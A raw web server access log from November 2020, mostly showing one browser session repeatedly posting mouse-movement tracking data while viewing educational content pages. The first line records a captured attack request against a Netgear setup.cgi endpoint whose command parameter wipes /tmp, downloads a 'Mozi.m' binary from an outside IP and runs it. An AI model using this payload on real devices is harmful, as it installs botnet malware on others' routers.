- - [26/Nov/2020:07:00:04 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.223.12.183:54430/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1835 "-" - "-"
- - [26/Nov/2020:08:49:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:35 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:36 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 384 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:45 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_development.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:49 +0000] "GET /content/software_engineering.php HTTP/1.1" 200 1915 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:52 +0000] "GET /content/software_engineering/software_requirements.php HTTP/1.1" 200 2607 "http://160.40.52.164/content/software_engineering.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:54 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:55 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:57 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:58 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:49:59 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:00 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:01 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:02 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:03 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:05 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:06 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:07 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:08 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:09 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:10 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:11 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:12 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:13 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:14 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:15 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:16 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:17 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:18 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:19 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:20 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:21 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:22 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:24 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:25 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:26 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:27 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:28 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:35 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:36 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:40 +0000] "-" 408 0 "-" - "-"
- - [26/Nov/2020:08:50:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:50:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/software_engineering/software_requirements.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
